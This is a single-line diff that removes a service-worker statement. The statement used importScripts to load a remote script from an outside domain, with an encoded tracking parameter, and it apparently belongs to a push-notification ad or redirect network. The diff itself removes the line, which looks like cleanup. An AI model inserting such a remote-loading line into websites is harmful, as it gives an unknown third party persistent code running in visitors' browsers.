@@ -1,1 +1,0 @@
-importScripts('https://ulmoyc.com/v1/sw-import.js?h=waWQiOjEwMDU1ODcsInNpZCI6MTEzMDMzOCwid2lkIjozNjIzNzAsInNyYyI6MiwicG0iOjB9eyJ&d=cnnn.life');
